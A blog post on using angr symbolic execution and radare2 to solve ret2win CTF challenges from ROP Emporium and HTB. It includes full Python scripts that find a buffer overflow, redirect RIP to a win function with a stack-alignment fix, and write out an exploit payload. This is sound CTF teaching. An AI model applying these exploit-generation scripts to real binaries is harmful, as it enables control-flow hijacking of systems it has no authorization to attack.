---
title: "Angr for Solving PWN Challenges"
layout: "post"
categories: "Linux"
tags: ["Vulnerability Research", "Symbolic Execution", "Reverse Engineering"]
---

Hello everyone, 

I'm back with another blog post on Angr, this time exploring its application in solving simple pwn challenges. In numerous CTFs, a ret2win-type pwn serves as the customary warm-up. However, this methodology proves entirely valid in certain real-world instances. Competitions often aim to emphasize exploit development techniques, providing relatively small binaries that compel solvers to follow intended paths. In real-world binaries, which link multiple libraries and contain thousands of lines of code, there are certainly more gadgets and useful exploit primitives available for attackers to leverage. This holds particularly true in many embedded systems, where binaries are compiled without canaries and PIE. This makes a return to functionality ROP chain more feasible because the code segment (.text) isn't randomized, and attackers don't need to leak or brute force a canary. 


To begin, let's explore a popular pwn challenge from ROP Emporium: [https://ropemporium.com/challenge/ret2win.html](https://ropemporium.com/challenge/ret2win.html). Our first step is to reverse engineer the binary. While I usually opt for Ghidra, this time I'll be trying out Radare2's decompilation functionality. Given that ret2win challenges typically have straightforward logic, Radare2 provides a quick way to decompile and identify any vulnerabilities.

For those using a Debian-based OS, the installation process for required packages should be similar to what I'll outline for Manjaro. Additionally, we'll set up a Python environment and install necessary packages to run Angr and Radare2.

```bash
sudo pacman -Syu base-devel ninja meson radare2
python3 -m venv re_vr
source vr/bin/activate
pip install angr 
pip install r2pipe

```

Now that our environment is set up, we can proceed with writing the code for decompiling the binary. I'll adopt a similar approach to the previous Angr blog, where I obtain a list of all the functions and verify that they are not imports. Then, I'll decompile those functions and print the results to a file. The code is provided below:

```py
import r2pipe
import argparse

def get_function_decompilations(binary_path, output_file):
    r2 = r2pipe.open(binary_path)

    # Analyze the binary
    r2.cmd('aaa')

    # Get a list of functions
    functions = r2.cmdj('aflj')

    with open(output_file, 'w') as f:
        for function in functions:
            function_name = function['name']

            # Check if the function is in the .text section and not an import
            if not function_name.startswith('sym.imp.'):
                # Get the decompilation of the function
                decompilation = r2.cmd(f'pdd @ {function_name}')
                if decompilation:
                    f.write(f"Function Name: {function_name}\n")
                    f.write(decompilation)
                    f.write('\n' + '='*40 + '\n')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Save decompilation of non-import functions to a file')
    parser.add_argument('binary_path', type=str, help='Path to the binary')
    parser.add_argument('output_file', type=str, help='Output file to save decompilation')
    args = parser.parse_args()

    get_function_decompilations(args.binary_path, args.output_file)

```

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/ret2win_radare.bmp)
![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/ret2win_source.bmp)




When examining the decompilation, we observe a buffer overflow in the pwnme function due to the read function reading in more bytes than what was allocated for the destination buffer. Following this function, we find the ret2win function, which is not in the call stack. However, if we can control the instruction pointer, we can perform a ROP attack to execute this function. This scenario is advantageous since the ret2win function doesn't require any parameters. Given our awareness of the overflow, we can now design an Angr program specifically tailored to exploit it.


```py
import angr
import claripy
import os

# Analyzing the main binary without automatically loading external libraries for a more concise and focused control flow graph.
project = angr.Project("./ret2win", auto_load_libs=False)

# Analyze the control flow graph of the binary
cfg = project.analyses.CFGFast()

# Set up the initial state with symbolic stdin
sym = claripy.BVS("stdin", 1024 * 8)

initial_state = project.factory.entry_state(stdin=sym)

# Create a SimulationManager that keeps track of unconstrained states
simgr = project.factory.simulation_manager(initial_state, save_unconstrained=True)

# Run until an unconstrained state occurs
simgr.run(until=lambda sm: len(sm.unconstrained) > 0)
print (simgr)

# Get the state in which the PC is controlled by the input
pwned_state = simgr.unconstrained[0]

print(pwned_state)

```

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/ret2win_unconstrained.bmp)


After executing the script, it appears that an unconstrained state has been identified. In this unconstrained state, the instruction pointer holds a symbolic value. We can try to constrain it to the address of the ret2win function. Subsequently, we will extract the concrete content of the stdin from the pwned_state to a file. This file will then provide the necessary payload to overwrite the return address with the ret2win function's address and facilitate the function call. The updated code is provided below:



```py
import angr
import claripy
import os

# Analyzing the main binary without automatically loading external libraries for a more concise and focused control flow graph.
project = angr.Project("./ret2win", auto_load_libs=False)

# Analyze the control flow graph of the binary
cfg = project.analyses.CFGFast()

# Get the address for ret2win from the binary
cat_flag = project.kb.functions["ret2win"].addr

# Set up the initial state with symbolic stdin
sym = claripy.BVS("stdin", 1024 * 8)

initial_state = project.factory.entry_state(stdin=sym)

# Create a SimulationManager that keeps track of unconstrained states
simgr = project.factory.simulation_manager(initial_state, save_unconstrained=True)

# Run until an unconstrained state occurs
simgr.run(until=lambda sm: len(sm.unconstrained) > 0)

# Get the state in which the PC is controlled by the input
pwned_state = simgr.unconstrained[0]

# Contraint rip to address of ret2win function
pwned_state.add_constraints(pwned_state.regs.rip == cat_flag)

# Extract the concrete content of stdin from pwned_state
exploit = pwned_state.posix.dumps(0)
with open("exploit", "wb") as f:
    f.write(exploit)
    f.write(b"\n") 

```

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/ret2win_segfault.bmp)

Upon running the binary with the stdin from the pwned state, we observed the message "Well done! Here's your flag:" However, instead of printing the flag, a segfault occurred. To better understand this issue, we turned to GDB for a detailed analysis of the program's behavior during the crash. Using the GEF plugin, available: [https://github.com/hugsy/gef](https://github.com/hugsy/gef). Below are the commands needed to get the output of the crash in gdb. 

```bash
gdb ./ret2win 
run < exploit
```

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/ret2win_movaps.bmp)


In GDB, we pinpointed that the crash is occurring at a movaps instruction. The ROP Emporium beginner guide delves into the intricacies of how this instruction affects GLIBC functions like printf and system: [https://ropemporium.com/guide.html#Appendix%20B](https://ropemporium.com/guide.html#Appendix%20B). Specifically, for x86_64 architecture, the movaps (Move Aligned Packed Single-Precision Floating-Point) instruction mandates that its destination operand, where it writes the data, must be aligned on a 16-byte boundary. Deviating from this alignment can result in a segmentation fault.

The article suggests mitigating this issue by padding your ROP chain with an extra ret before returning into a function or returning further into a function to skip a push instruction. 

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/ret2win_disas.bmp)

After analyzing the disassembly of the ret2win function, I decided to circumvent the problematic push instruction and instead jump to address 0x00400757. At this address, the instruction mov %rsp, %rbp effectively moves the value of the stack pointer (%rsp) into the base pointer register (%rbp), offering a resolution to the alignment issue induced by movaps. To address this adjustment in the stack, the Angr script needs an update. Below is the modified Angr script:

```py
import angr
import claripy
import os

# Analyzing the main binary without automatically loading external libraries for a more concise and focused control flow graph.
project = angr.Project("./ret2win", auto_load_libs=False)

# Analyze the control flow graph of the binary
cfg = project.analyses.CFGFast()

# Get the address for ret2win from the binary
cat_flag = project.kb.functions["ret2win"].addr

# The required adjustment needed to fix stack alignment issue
alignment_required = 1  

# Create a symbolic variable for the stack adjustment
stack_adjustment = claripy.BVS("stack_adjustment", 8 * 8)

# Adjust the symbolic stack size based on the alignment requirement
sym = claripy.BVS("stdin", (1024 + alignment_required) * 8)

# Create the initial state with the adjusted stack size
initial_state = project.factory.entry_state(
    stdin=sym,
    add_options={angr.options.STRICT_PAGE_ACCESS}
)

# Add a constraint for the stack adjustment
initial_state.add_constraints(stack_adjustment == alignment_required)

# Create a SimulationManager that keeps track of unconstrained states
simgr = project.factory.simulation_manager(initial_state, save_unconstrained=True)

# Run until an unconstrained state occurs
simgr.run(until=lambda sm: len(sm.unconstrained) > 0)

# Get the state in which the PC is controlled by the input
pwned_state = simgr.unconstrained[0]

# Contraint rip to address of ret2win plus the stack adjustment
pwned_state.add_constraints(pwned_state.regs.rip == cat_flag + stack_adjustment)

# Extract the concrete content of stdin from pwned_state
exploit = pwned_state.posix.dumps(0)
with open("exploit", "wb") as f:
    f.write(exploit)
    f.write(b"\n") 
```
![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/ret2win_flag.bmp)


This time, successfully executing the binary with the exploit via stdin resulted in the flag being printed! Now that I have successfully completed the ret2win challenge, I will test the script on the labyrinth challenge from last year's HTB Cyber Apocalypse CTF. This warm-up pwn challenge required navigating through the right door, executing a buffer overflow, and returning to the escape_plan function within the binary. Upon reaching this function, the flag is revealed. The modified code below reflects the changes made, primarily focusing on the binary being analyzed and the updated cat_flag variable.

```py
import angr
import claripy
import os

# Analyzing the main binary without automatically loading external libraries for a more concise and focused control flow graph.
project = angr.Project("./labyrinth", auto_load_libs=False)

# Analyze the control flow graph of the binary
cfg = project.analyses.CFGFast()

# Get the address for escape_plan from the binary
cat_flag = project.kb.functions["escape_plan"].addr

# The required adjustment needed to fix stack alignment issue
alignment_required = 1  

# Create a symbolic variable for the stack adjustment
stack_adjustment = claripy.BVS("stack_adjustment", 8 * 8)

# Adjust the symbolic stack size based on the alignment requirement
sym = claripy.BVS("stdin", (1024 + alignment_required) * 8)

# Create the initial state with the adjusted stack size
initial_state = project.factory.entry_state(
    stdin=sym,
    add_options={angr.options.STRICT_PAGE_ACCESS}
)

# Add a constraint for the stack adjustment
initial_state.add_constraints(stack_adjustment == alignment_required)

# Create a SimulationManager that keeps track of unconstrained states
simgr = project.factory.simulation_manager(initial_state, save_unconstrained=True)

# Run until an unconstrained state occurs
simgr.run(until=lambda sm: len(sm.unconstrained) > 0)

# Get the state in which the PC is controlled by the input
pwned_state = simgr.unconstrained[0]

# Contraint rip to address of escape_plan plus the stack adjustment
pwned_state.add_constraints(pwned_state.regs.rip == cat_flag + stack_adjustment)

# Extract the concrete content of stdin from pwned_state
exploit = pwned_state.posix.dumps(0)
with open("exploit", "wb") as f:
    f.write(exploit)
```

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/generate_exploit.bmp)

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/labyrinth_source.bmp)

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/labyrinth_flag.bmp)

![](/assets/posts/2024-02-18-angr-for-solving-pwn-challenges/labyrinth_gdb.bmp)


After running the exploit, we successfully obtained the flag, despite encountering a segfault that was traced back to the movaps instruction. While there is more work to be done to understand and address this issue, the current state allows us to print the flag, marking it as a win. Angr proved its capability by determining the correct door and constructing an exploit to return to the escape_plan function.

In the blog, I demonstrated how Angr's symbolic execution ability enables the exploration of all paths, essentially walking through program flow to identify the right path leading to the overflow. Although this example focused on a simple ret2win-style exploit, it's worth noting that Angr can handle more advanced programs involving modern ROP chaining and heap exploitation.

For now, this concludes my blog. I hope everyone found it useful. Thanks for reading, and rock on!